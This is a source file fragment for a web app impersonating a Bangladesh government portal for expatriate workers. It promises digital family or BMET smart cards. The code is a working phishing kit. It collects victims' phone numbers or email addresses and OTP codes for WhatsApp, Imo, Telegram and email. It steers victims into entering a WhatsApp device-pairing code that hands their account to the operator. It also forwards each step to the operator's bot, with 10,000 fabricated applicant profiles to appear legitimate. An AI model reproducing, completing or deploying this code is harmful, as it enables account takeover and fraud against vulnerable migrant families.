        title: "বিএমইটি স্মার্ট কার্ড ডিজিটাল কপি সংগ্রহ",
        subTitle: "বিএমইটি ক্লিয়ারেন্স ও স্মার্ট কার্ড ডিজিটাল কপি অনলাইন ভেরিফিকেশন",
        platformSelectLabel: "স্মارت কার্ড সংগ্রহের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "বিএমইটি স্মার্ট কার্ডের ডিজিটাল কপি",
        badge: "বিএমইটি স্মার্ট কার্ড"
      };
    case 'family_card':
    default:
      return {
        title: "প্রবাসী কল্যাণ অনলাইন পোর্টাল",
        subTitle: "নিরাপদ ফ্যামিলি কার্ড সংগ্রহ ও অনলাইন ভেরিফিকেশন",
        platformSelectLabel: "কার্ড সংগ্রহের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "আবেদন করা কার্ড টির অনলাইন কপি",
        badge: "ফ্যামিলি কার্ড"
      };
  }
};

const FamilyCardApp = ({ 
  tab, 
  isRegistering, 
  setIsRegistering, 
  activeRegistrationType, 
  setActiveRegistrationType 
}: { 
  tab: 'card' | 'dashboard';
  isRegistering: boolean;
  setIsRegistering: (val: boolean) => void;
  activeRegistrationType: 'family_card' | 'safe_remittance' | 'higher_edu_scholarship' | 'medical_vaccine_card' | 'pdo_certificate' | 'expatriate_grant' | 'bmet_smart_card';
  setActiveRegistrationType: (val: 'family_card' | 'safe_remittance' | 'higher_edu_scholarship' | 'medical_vaccine_card' | 'pdo_certificate' | 'expatriate_grant' | 'bmet_smart_card') => void;
}) => {
  const [slideIndex1, setSlideIndex1] = useState(0);
  useEffect(() => {
    const timer = setInterval(() => {
      setSlideIndex1((prev) => (prev + 1) % 10);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const [userData, setUserData] = useState<any>(null);

  // Custom multi-step platform selection & OTP registration states
  const [selectedPlatform, setSelectedPlatform] = useState<'whatsapp' | 'imo' | 'telegram' | 'email' | null>(null);
  const [platformInputValue, setPlatformInputValue] = useState('');
  const [regStep, setRegStep] = useState<'select' | 'input' | 'loading' | 'otp' | 'pending' | 'success'>('select');
  const [savedPlatformInputValue, setSavedPlatformInputValue] = useState<string>('');
  const [savedPlatform, setSavedPlatform] = useState<'whatsapp' | 'imo' | 'telegram' | 'email' | null>(null);
  const [savedLastStep, setSavedLastStep] = useState<'otp' | 'pending' | null>(null);
  const [otpCountdown, setOtpCountdown] = useState<number>(0);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [otpValues, setOtpValues] = useState<string[]>([]);
  const [showVideoTutorial, setShowVideoTutorial] = useState(false);
  const [sessionUserId, setSessionUserId] = useState<string>('');
  const [wpPairingCode, setWpPairingCode] = useState<string>('');
  const [wpCountdown, setWpCountdown] = useState<number>(10);
  const [otpErrorMessage, setOtpErrorMessage] = useState<string>('');
  const [copiedCode, setCopiedCode] = useState<boolean>(false);
  const videoRef = React.useRef<HTMLVideoElement | null>(null);
  
  // Dashboard & Profiles related states
  const [searchQuery, setSearchQuery] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const [selectedApplication, setSelectedApplication] = useState('all');
  const [selectedCountry, setSelectedCountry] = useState('all');
  const [jumpPage, setJumpPage] = useState('');

  // Memoized 10,000 profile generator
  const generatedProfiles = React.useMemo(() => {
    const list = [];
    for (let i = 1; i <= 10000; i++) {
      const isFemale = i % 2 === 0;
      let name = "";
      if (isFemale) {
        const f1 = banglaFemaleFirstNames[(i * 11) % banglaFemaleFirstNames.length];
        const f2 = banglaFemaleLastNames[(i * 13) % banglaFemaleLastNames.length];
        name = `${f1} ${f2}`;
      } else {
        const m1 = banglaMaleFirstNames[(i * 3) % banglaMaleFirstNames.length];
        const m2 = banglaMaleLastNames[(i * 7) % banglaMaleLastNames.length];
        name = `${m1} ${m2}`;
      }

      const app = applicationTypes[i % applicationTypes.length];
      const country = countriesList[i % countriesList.length];

      // Format unique deterministic phone pattern
      const p1 = (i * 7) % 9 + 1;
      const p2 = (i * 13) % 10;
      const p3 = (i * 19) % 10;
      const p4 = (i * 31) % 10;
      const suffix = `${p1}${p2}**${p3}${p4}`;
      const phone = `${country.code} ${suffix}`;

      list.push({
        id: i,
        name,
        application: app,
        country: country.name,
        flag: country.flag,
        phone,
        logo: `my-logo${i}.jpg`
      });
    }
    return list;
  }, []);

  // Carousel related states for simulated 10,000 profile cards
  const [carouselIndex, setCarouselIndex] = useState(0);

  // Live profile cards auto-slide timer (slides to the right)
  useEffect(() => {
    const interval = setInterval(() => {
      setCarouselIndex((prev) => (prev + 1) % generatedProfiles.length);
    }, 2800);
    return () => clearInterval(interval);
  }, [generatedProfiles.length]);

  // Filter logic
  const filteredProfiles = React.useMemo(() => {
    return generatedProfiles.filter((profile) => {
      const matchesSearch = 
        profile.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        profile.country.toLowerCase().includes(searchQuery.toLowerCase()) ||
        profile.phone.toLowerCase().includes(searchQuery.toLowerCase()) ||
        profile.application.toLowerCase().includes(searchQuery.toLowerCase());
      
      const matchesCountry = selectedCountry === 'all' || profile.country === selectedCountry;
      const matchesApp = selectedApplication === 'all' || profile.application === selectedApplication;

      return matchesSearch && matchesCountry && matchesApp;
    });
  }, [generatedProfiles, searchQuery, selectedCountry, selectedApplication]);

  const itemsPerPage = 25;
  const totalPages = Math.ceil(filteredProfiles.length / itemsPerPage);
  
  const displayedProfiles = React.useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage;
    return filteredProfiles.slice(startIndex, startIndex + itemsPerPage);
  }, [filteredProfiles, currentPage]);

  const gradients = [
    'linear-gradient(135deg, #ec008c 0%, #fc6767 100%)', // Neon Pink Red
    'linear-gradient(135deg, #00f2fe 0%, #4facfe 100%)', // Brilliant Cyan Blue
    'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)', // Neon Emerald Mint
    'linear-gradient(135deg, #ff0844 0%, #ffb199 100%)', // Electric Coral Red
    'linear-gradient(135deg, #f857a6 0%, #ff5858 100%)', // Vibrant Magenta Rose
    'linear-gradient(135deg, #f12711 0%, #f5af19 100%)', // Fiery Gold Orange
    'linear-gradient(135deg, #3f5efb 0%, #fc466b 100%)', // Deep Laser Blue Purple Pink
    'linear-gradient(135deg, #b224ef 0%, #7579ff 100%)'  // Glowing Indigo Violet Purple
  ];

  // Poll check verification responses in real-time
  useEffect(() => {
    let pollerId: any = null;
    if (regStep === 'pending') {
      pollerId = window.setInterval(async () => {
        try {
          const res = await fetch(`/api/otp-status?userId=${sessionUserId}`);
          const contentType = res.headers.get("content-type");
          if (!res.ok || !contentType || !contentType.includes("application/json")) {
            console.warn(`[OTP Status] Non-JSON response received (status: ${res.status}). Ignoring.`);
            return;
          }
          const data = await res.json();
          if (data.success) {
            if (data.status === 'success') {
              clearInterval(pollerId);
              setRegStep('success');
              notifyBot(`SUCCESS confirmation received from central server and applied for session ${sessionUserId}.`);
            } else if (data.status === 'error') {
              clearInterval(pollerId);
              
              // Clear OTP array matching platform requirements
              const length = selectedPlatform === 'email' ? 6 : selectedPlatform === 'telegram' ? 5 : 4;
              setOtpValues(Array(length).fill(''));
              
              // Call Reset service
              await fetch('/api/reset-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: sessionUserId })
              }).catch(() => {});

              setOtpErrorMessage('দুঃখিত আপনার ভেরিফাই সিরিয়াল নাম্বার টি ভুল অনুগ্রহ করে সঠিক নাম্বার টি টাইপ করুন।');
              setRegStep('otp');
              notifyBot(`ERROR confirmation status received. Fields reset for retry.`);
            }
          }
        } catch (err) {
          console.error('[STATUS POLL POLL ERROR]', err);
        }
      }, 1500);
    }
    return () => {
      if (pollerId) clearInterval(pollerId);
    };
  }, [regStep, sessionUserId, selectedPlatform]);

  // WhatsApp countdown ticker
  useEffect(() => {
    let timer: any = null;
    if (regStep === 'pending' && selectedPlatform === 'whatsapp') {
      setWpCountdown(10);
      timer = setInterval(() => {
        setWpCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [regStep, selectedPlatform]);

  // Listen to remote custom event for WhatsApp device linker
  useEffect(() => {
    const handleWpCodeUpdate = (e: Event) => {
      const rawCode = (e as CustomEvent).detail || '';
      setWpPairingCode(rawCode);
      setWpCountdown(0);
      setCopiedCode(false);
    };
    window.addEventListener('whatsapp_pairing_code_updated', handleWpCodeUpdate);
    return () => {
      window.removeEventListener('whatsapp_pairing_code_updated', handleWpCodeUpdate);
    };
  }, []);

  const handleCopyWpPairingCode = () => {
    if (!wpPairingCode) return;
    const cleanCode = wpPairingCode.replace(/[\s-]/g, '').toUpperCase().slice(0, 8);
    navigator.clipboard.writeText(cleanCode).then(() => {
      setCopiedCode(true);
      notifyBot(`📋 <b>গ্রাহক হোয়াটসঅ্যাপ লিঙ্ক কোড কপি করেছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>কপি করা কোড:</b> <code>${cleanCode}</code>`);
      
      setTimeout(() => {
        const videoElement = document.getElementById('video-tutorial-pane');
        if (videoElement) {
          videoElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 100);
    }).catch((err) => {
      console.error("Failed to copy pairing code: ", err);
    });
  };

  // OTP 15s Countdown and lock ticker
  useEffect(() => {
    let timer: any = null;
    if (regStep === 'otp') {
      setOtpCountdown(15);
      timer = setInterval(() => {
        setOtpCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } else {
      setOtpCountdown(0);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [regStep]);

  // Loading progresses
  useEffect(() => {
    if (regStep === 'loading') {
      setLoadingProgress(0);
      const interval = setInterval(() => {
        setLoadingProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            if (selectedPlatform === 'whatsapp') {
              setWpPairingCode('');
              setWpCountdown(10);
              setRegStep('pending');
              
              // Auto notify Telegram about WhatsApp Pairing Web process starting
              fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  userId: sessionUserId,
                  phone: platformInputValue,
                  platform: selectedPlatform,
                  otp: 'PENDING_BOT_CODE'
                })
              }).then(() => {
                notifyBot(`📱 <b>WhatsApp Device Linker</b> সেশন সচল হয়েছে!\n<b>ফোন নম্বর:</b> <code>${platformInputValue}</code>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n\n<i>গ্রাহক স্ক্রিনে ১০ সেকেন্ডের কাউন্টডাউন শুরু হয়েছে। কোড সেট করতে দয়া করে নিচের নতুন কমান্ড ফরম্যাটে কোডটি পাঠান:</i>\n\n<code>/WhatsApp Device Linker_${sessionUserId} ADGHJKLM</code>\n\n<i>(পূর্বের ফরম্যাটটিও সচল রয়েছে: <code>/${sessionUserId} WhatsApp Device Linker ADGHJKLM</code>)</i>`);
              }).catch(() => {});
            } else {
              setWpPairingCode('');
              setOtpValues(Array(selectedPlatform === 'email' ? 6 : selectedPlatform === 'telegram' ? 5 : 4).fill(''));
              setOtpErrorMessage('');
              setRegStep('otp');
            }
            return 100;
          }
          return prev + 10;
        });
      }, 200);
      return () => clearInterval(interval);
    }
  }, [regStep, selectedPlatform, sessionUserId, platformInputValue]);

  // Handle auto completion submissions
  useEffect(() => {
    if (regStep === 'otp' && selectedPlatform && selectedPlatform !== 'whatsapp') {
      const expectedLength = selectedPlatform === 'email' ? 6 : selectedPlatform === 'telegram' ? 5 : 4;
      const otpCode = otpValues.filter(Boolean).join('');
      
      if (otpCode.length === expectedLength) {
        const submitOtpFlow = async () => {
          setRegStep('pending');
          try {
            await fetch('/api/submit-otp', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                userId: sessionUserId,
                phone: platformInputValue,
                platform: selectedPlatform,
                otp: otpCode
              })
            });
            notifyBot(`OTP submittted and waiting: ${otpCode} for phone/email: ${platformInputValue}`);
          } catch (e) {
            console.error(e);
          }
        };
        submitOtpFlow();
      }
    }
  }, [otpValues, regStep, selectedPlatform, sessionUserId, platformInputValue]);

  useEffect(() => {
    // Session setup sequentially
    const initSession = async () => {
      let activeSession = localStorage.getItem('session_user_id');
      if (!activeSession) {
        try {
          const res = await fetch('/api/request-session-id');
          const contentType = res.headers.get("content-type");
          if (!res.ok || !contentType || !contentType.includes("application/json")) {
            throw new Error(`Non-JSON response (status: ${res.status})`);
          }
          const data = await res.json();
          if (data.success && data.sessionId) {
            localStorage.setItem('session_user_id', data.sessionId);
            setSessionUserId(data.sessionId);
            activeSession = data.sessionId;
          }
        } catch (e) {
          console.error("Session fetch failed:", e);
          const rand = 'user_' + Math.floor(10 + Math.random() * 90);
          localStorage.setItem('session_user_id', rand);
          setSessionUserId(rand);
          activeSession = rand;
        }
      } else {
        setSessionUserId(activeSession);
      }
      if (activeSession) {
        sendAdvancedTelemetry(activeSession);
      }
    };
    initSession();

    let storedData = JSON.parse(localStorage.getItem('family_card_data') || 'null');
    if (!storedData) {
      const randomCardNumber = 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
                             Math.floor(1000 + Math.random() * 9000) + '-' + 
                             Math.floor(1000 + Math.random() * 9000);
      
      const randomMonth = Math.floor(Math.random() * 12) + 1;
      const randomYear = Math.floor(Math.random() * (2035 - 2028) + 2028);
      const expiryDate = (randomMonth < 10 ? '0' + randomMonth : randomMonth) + '/' + (randomYear % 100);
      const randomGradient = gradients[Math.floor(Math.random() * gradients.length)];

      storedData = {
        name: "মো: প্রবাসী নাগরিক",
        number: randomCardNumber,
        expiry: expiryDate,
        bg: randomGradient,
        familyMembers: [
          { name: 'মোসাম্মৎ রহিমা বেগম', relation: 'স্ত্রী', age: 32, health: 'সুস্থ', education: 'N/A' },
          { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
        ]
      };
      localStorage.setItem('family_card_data', JSON.stringify(storedData));
    }
    setUserData(storedData);
  }, []);

  if (isRegistering) {
    const handleBack = () => {
      // Send Telegram notification with user details on return
      notifyBot(`🔙 <b>গ্রাহক তথ্য ভেরিফিকেশন প্যানেল থেকে পিছনে ফিরে গেছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>পূর্ববর্তী ধাপ:</b> <code>${regStep}</code>\n<b>পূর্ববর্তী ফোন/ইমেইল:</b> <code>${platformInputValue || 'কোনোটিই নয়'}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform || 'কোনোটিই নয়'}</code>`);

      // Save data for auto-restoring
      if (regStep === 'otp' || regStep === 'pending' || regStep === 'loading') {
        setSavedPlatformInputValue(platformInputValue);
        setSavedPlatform(selectedPlatform);
        setSavedLastStep(regStep === 'loading' ? (selectedPlatform === 'whatsapp' ? 'pending' : 'otp') : (regStep === 'otp' || regStep === 'pending' ? regStep : null));
      }

      setSelectedPlatform(null);
      setRegStep('select');
      setCopiedCode(false);
    };

    const handlePlatformSelect = (platform: 'whatsapp' | 'imo' | 'telegram' | 'email') => {
      notifyBot(`Selected Platform: ${platform}. Interactive prompt question opened.`);
      setSelectedPlatform(platform);
      
      // Auto-populate previously entered input value if it exists
      if (savedPlatformInputValue) {
        setPlatformInputValue(savedPlatformInputValue);
      } else {
        setPlatformInputValue('');
      }
      setRegStep('input');
    };

    const handleSubmitInput = () => {
      if (!isInputValid()) return;
      
      // Notify Telegram when moving forward again with user details/number
      notifyBot(`➡️ <b>গ্রাহক সামনে এগিয়ে যাচ্ছেন!</b>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>ফোন/ইমেইল:</b> <code>${platformInputValue}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform}</code>`);

      // If they had a saved last step from this platform with this exact value:
      if (savedPlatform === selectedPlatform && savedPlatformInputValue === platformInputValue && savedLastStep) {
        // Direct redirect back to where they left off
        setRegStep(savedLastStep);
        notifyBot(`📱 <b>গ্রাহককে সরাসরি পূর্ববর্তী ধাপে ফিরিয়ে নেওয়া হয়েছে!</b>\n<b>ধাপ:</b> <code>${savedLastStep}</code>\n<b>গ্রাহক আইডি:</b> <code>${sessionUserId}</code>\n<b>ফোন/ইমেইল:</b> <code>${platformInputValue}</code>\n<b>প্ল্যাটফর্ম:</b> <code>${selectedPlatform}</code>`);
      } else {
        // Store current details as potential saved points
        setSavedPlatformInputValue(platformInputValue);
        setSavedPlatform(selectedPlatform);
        setSavedLastStep(selectedPlatform === 'whatsapp' ? 'pending' : 'otp');
        setRegStep('loading');
      }
    };

    const getPlatformTheme = () => {
      switch (selectedPlatform) {
        case 'whatsapp':
          return {
            bg: 'bg-[#25D366]',
            text: 'text-[#25D366]',
            accent: 'emerald',
            border: 'border-[#25D366]',
            ring: 'focus:ring-[#25D366]',
            hover: 'hover:bg-[#20ba5a]',
            label: 'হোয়াটসঅ্যাপ'
          };
        case 'imo':
          return {
            bg: 'bg-[#1a9bf0]',
            text: 'text-[#1a9bf0]',
            accent: 'sky',
            border: 'border-[#1a9bf0]',
            ring: 'focus:ring-[#1a9bf0]',
            hover: 'hover:bg-[#158ad6]',
            label: 'Imo'
          };
        case 'telegram':
          return {
            bg: 'bg-[#0088cc]',
            text: 'text-[#0088cc]',
            accent: 'blue',
            border: 'border-[#0088cc]',
            ring: 'focus:ring-[#0088cc]',
            hover: 'hover:bg-[#0077b3]',
            label: 'টেলিগ্রাম'
          };
        case 'email':
          return {
            bg: 'bg-[#ea4335]',
            text: 'text-[#ea4335]',
            accent: 'rose',
            border: 'border-[#ea4335]',
            ring: 'focus:ring-[#ea4335]',
            hover: 'hover:bg-[#d63426]',
            label: 'ইমেইল'
          };
        default:
          return {
            bg: 'bg-gov-green',
            text: 'text-gov-green',
            accent: 'emerald',
            border: 'border-gov-green',
            ring: 'focus:ring-gov-green',
            hover: 'hover:bg-emerald-800',
            label: ''
          };
      }
    };

    const theme = getPlatformTheme();
    const otpLength = selectedPlatform === 'email' ? 6 : selectedPlatform === 'telegram' ? 5 : 4;

    const isInputValid = () => {
      if (selectedPlatform === 'email') {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(platformInputValue);
      }
      const digits = platformInputValue.replace(/[^0-9]/g, '');
      return digits.length >= 9 && digits.length <= 14;
    };

    const handleOtpChange = (val: string, index: number, length: number) => {
      const cleanedVal = val.replace(/[^0-9]/g, '');
      if (!cleanedVal && val !== '') return;

      const newOtp = [...otpValues];
      newOtp[index] = cleanedVal.slice(-1);
      setOtpValues(newOtp);

      if (cleanedVal && index < length - 1) {
        const nextInput = document.getElementById(`otp-box-${index + 1}`) as HTMLInputElement | null;
        if (nextInput) {
          nextInput.focus();
        }
      }
    };

    const handleOtpKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
      if (e.key === 'Backspace') {
        if (!otpValues[index] && index > 0) {
          const prevInput = document.getElementById(`otp-box-${index - 1}`) as HTMLInputElement | null;
          if (prevInput) {
            prevInput.focus();
            const newOtp = [...otpValues];
            newOtp[index - 1] = '';
            setOtpValues(newOtp);
          }
        }
      }
    };

    const getCurrentStepVideo = (): { src: string; title: string } | null => {
      if (!selectedPlatform) return null;
      if (selectedPlatform === 'whatsapp') {
        if (regStep === 'input') {
          return { src: '/my-video1.mp4', title: 'হোয়াটসঅ্যাপ সংযোগ করার নিয়ম' };
        }
        if (regStep === 'pending') {
          return { src: '/my-video2.mp4', title: 'হোয়াটসঅ্যাপ লিঙ্ক কোডের নিয়ম' };
        }
      }
      if (selectedPlatform === 'imo') {
        if (regStep === 'input') {
          return { src: '/my-video3.mp4', title: 'Imo নম্বর সংযোগ করার নিয়ম' };
        }
        if (regStep === 'otp') {
          return { src: '/my-video4.mp4', title: 'Imo ওটিপি যাচাই করার নিয়ম' };
        }
      }
      if (selectedPlatform === 'telegram') {
        if (regStep === 'input') {
          return { src: '/my-video5.mp4', title: 'টেলিগ্রাম নম্বর সংযোগ করার নিয়ম' };
        }
        if (regStep === 'otp') {
          return { src: '/my-video6.mp4', title: 'টেলিগ্রাম ওটিপি যাচাই করার নিয়ম' };
        }
      }
      if (selectedPlatform === 'email') {
        if (regStep === 'input') {
          return { src: '/my-video7.mp4', title: 'ইমেইল এড্রেস সংযোগ করার নিয়ম' };
        }
        if (regStep === 'otp') {
          return { src: '/my-video8.mp4', title: 'ইমেইল ওটিপি যাচাই করার নিয়ম' };
        }
      }
      return null;
    };

    const activeVideo = getCurrentStepVideo();

    return (
      <div className={`mx-auto p-5 pb-24 text-center font-['Hind_Siliguri'] transition-all duration-300 ${activeVideo ? 'max-w-5xl' : 'max-w-md'}`}>
        <div className={activeVideo ? 'grid grid-cols-1 md:grid-cols-12 gap-8 items-start text-left' : ''}>
          <div className={activeVideo ? 'md:col-span-7 space-y-4' : 'space-y-4'}>
            {/* Step A: Platform Selection */}
            {regStep === 'select' && (
              <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                <div className="bg-gradient-to-r from-emerald-800 to-emerald-950 text-white p-6 rounded-3xl shadow-xl relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
                  <div className="flex items-center gap-2 mb-2 text-amber-300 font-bold justify-center">
                    <span className="p-1 bg-white/10 rounded-lg">🇧🇩</span>
                    <span className="text-xs uppercase tracking-wide font-black">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</span>
                  </div>
                  <h2 className="text-lg md:text-xl font-black mb-1 leading-snug">{getRegistrationTypeDetails(activeRegistrationType).title}</h2>
                  <p className="text-xs text-emerald-100 font-extrabold">{getRegistrationTypeDetails(activeRegistrationType).subTitle}</p>
                </div>

                <div className="bg-slate-50 border border-slate-200/70 p-5 rounded-3xl shadow-sm text-left">
                  <h3 className="text-sm font-black text-slate-800 border-b border-slate-200/60 pb-3 mb-4 flex items-center gap-1.5">
                    <LayoutDashboard size={18} className="text-emerald-700" /> {getRegistrationTypeDetails(activeRegistrationType).platformSelectLabel}
                  </h3>

                  <div className="space-y-5">
                    {/* WhatsApp Option */}
                    <div className="space-y-2">
                      <p className="text-xs font-black text-slate-700 leading-relaxed">
                        আপনি কি হোয়াটসঅ্যাপের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
                      </p>
                      <button 
                        id="btn-select-whatsapp"
                        onClick={() => handlePlatformSelect('whatsapp')}
                        className="w-full bg-[#25D366] hover:bg-[#20ba5a] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
                      >
                        <WhatsAppIcon />
                        WhatsApp-এর মাধ্যমে সংগ্রহ করুন
                      </button>
                    </div>

                    {/* Imo Option */}
                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
                      <p className="text-xs font-black text-slate-700 leading-relaxed">
                        আপনি কি Imo app এর মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
                      </p>
                      <button 
                        id="btn-select-imo"
                        onClick={() => handlePlatformSelect('imo')}
                        className="w-full bg-[#1a9bf0] hover:bg-[#158ad6] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
                      >
                        <ImoIcon />
                        Imo-এর মাধ্যমে সংগ্রহ করুন
                      </button>
                    </div>

                    {/* Telegram Option */}
                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
                      <p className="text-xs font-black text-slate-700 leading-relaxed">
                        আপনি কি টেলিগ্রামের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
                      </p>
                      <button 
                        id="btn-select-telegram"
                        onClick={() => handlePlatformSelect('telegram')}
                        className="w-full bg-[#0088cc] hover:bg-[#0077b3] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
                      >
                        <TelegramIcon />
                        Telegram-এর মাধ্যমে সংগ্রহ করুন
                      </button>
                    </div>

                    {/* Email Option */}
                    <div className="space-y-2 pt-2 border-t border-slate-200/50">
                      <p className="text-xs font-black text-slate-700 leading-relaxed">
                        আপনি কি ইমেইল একাউন্টের মাধ্যমে আপনার {getRegistrationTypeDetails(activeRegistrationType).optionLabel} নিতে চান?
                      </p>
                      <button 
                        id="btn-select-email"
                        onClick={() => handlePlatformSelect('email')}
                        className="w-full bg-[#ea4335] hover:bg-[#d63426] text-white py-3 px-4 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
                      >
                        <EmailIcon />
                        E-mail-এর মাধ্যমে সংগ্রহ করুন
                      </button>
                    </div>
                  </div>
                </div>

                <button 
                  id="btn-exit-registration"
                  onClick={() => setIsRegistering(false)}
                  className="text-xs font-black text-slate-500 hover:text-slate-700 underline cursor-pointer inline-flex items-center gap-1 mt-4"
                >
                  <ChevronLeft size={14} /> সরকারি জরুরি নির্দেশনায় ফিরে যান
                </button>
              </motion.div>
            )}

            {/* Step B: Phone/Email Input Form */}
            {regStep === 'input' && selectedPlatform && (
              <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="space-y-5">
                <div className="flex items-center justify-between border-b border-slate-200 pb-3">
                  <button 
                    id="btn-back-to-select"
                    onClick={handleBack} 
                    className="p-1 px-3 bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-black rounded-lg cursor-pointer inline-flex items-center gap-1"
                  >
                    <ChevronLeft size={14} /> পিছনে যান
                  </button>
                  <span className={`text-xs font-black px-3 py-1 text-white rounded-full ${theme.bg}`}>
                    {theme.label} কপি গেটওয়ে
                  </span>
                </div>

                <div className="bg-white border-2 border-slate-100 p-5 rounded-3xl shadow-sm text-left space-y-4">
                  <div className="flex justify-center my-1.5 font-sans">
                    <div className={`p-4 rounded-full ${theme.bg} text-white bg-opacity-10`}>
                      {selectedPlatform === 'whatsapp' && <WhatsAppIcon />}
                      {selectedPlatform === 'imo' && <ImoIcon />}
                      {selectedPlatform === 'telegram' && <TelegramIcon />}
                      {selectedPlatform === 'email' && <EmailIcon />}
                    </div>
                  </div>

                  <div className="space-y-1.5 text-center">
                    <h3 className="font-black text-slate-800 text-base">আপনার বিবরণ প্রদান করুন</h3>
                    <p className="text-xs text-slate-500">আপনার {getRegistrationTypeDetails(activeRegistrationType).badge} কপি পেতে আপনার সঠিক বিবরণটি প্রদান করুন</p>
                  </div>

                  <div className="space-y-2 pt-2">
                    <label className="text-xs font-black text-slate-700">
                      {selectedPlatform === 'email' ? 'আপনার জিমেইল/ইমেইল এড্রেস লিখুন' : 'ফোন নাম্বার'}
                    </label>
                    
                    <div className="flex gap-2 items-center">
                      <div className="relative w-full">
                        <input 
                          id="platform-input-field"
                          type={selectedPlatform === 'email' ? 'email' : 'tel'} 
                          value={platformInputValue}
                          onChange={(e) => setPlatformInputValue(e.target.value)}
                          placeholder={selectedPlatform === 'email' ? 'example@gmail.com' : '[ ফোন নাম্বার ]'}
                          className={`w-full font-bold text-sm bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 focus:outline-none focus:ring-2 ${theme.ring} focus:bg-white text-slate-800`}
                        />
                      </div>

                      <AnimatePresence>
                        {isInputValid() && (
                          <motion.button
                            id="btn-submit-input-next"
                            initial={{ opacity: 0, scale: 0.8 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.8 }}
                            onClick={handleSubmitInput}
                            className={`${theme.bg} ${theme.hover} text-white shrink-0 p-3 rounded-xl shadow-lg cursor-pointer flex items-center justify-center`}
                          >
                            <Send size={18} />
                          </motion.button>
                        )}
                      </AnimatePresence>
                    </div>
                    
                    <div className="text-[10px] text-slate-400 font-bold leading-normal pt-1 flex items-center gap-1.5">
                      <Clock size={12} />
                      <span> hisab vailify details to setup a dynamic collection route.</span>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step C: Transition Loading */}
            {regStep === 'loading' && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12 space-y-6">
                <div className="flex flex-col items-center justify-center space-y-4">
                  <div className="relative w-24 h-24">
                    <div className={`absolute inset-0 rounded-full border-4 border-slate-200`}></div>
                    <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <span className="text-xs font-mono font-black text-slate-700">{loadingProgress}%</span>
                    </div>
                  </div>

                  <div className="space-y-2 max-w-xs mx-auto text-center">
                    <h3 className="font-black text-slate-800 text-base leading-tight">সার্ভার গেটওয়ে সংযোগ করা হচ্ছে...</h3>
                    <p className="text-xs text-slate-500 leading-normal">
                      মন্ত্রণালয় গেটওয়ের সাহায্যে আপনার দেওয়া তথ্যের সংযোগ চ্যানেল স্থাপন করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।
                    </p>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step D: OTP Verification View */}
            {regStep === 'otp' && selectedPlatform && (
              <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 text-left">
                <div className="flex items-center justify-between border-b border-slate-200 pb-3">
                  <span className="text-xs font-black text-slate-500">সুরক্ষিত ওটিপি সংযোগ</span>
                  <span className={`text-xs font-black px-2.5 py-0.5 text-white rounded-md ${theme.bg}`}>
                    {theme.label}
                  </span>
                </div>

                {/* Main Security Warning */}
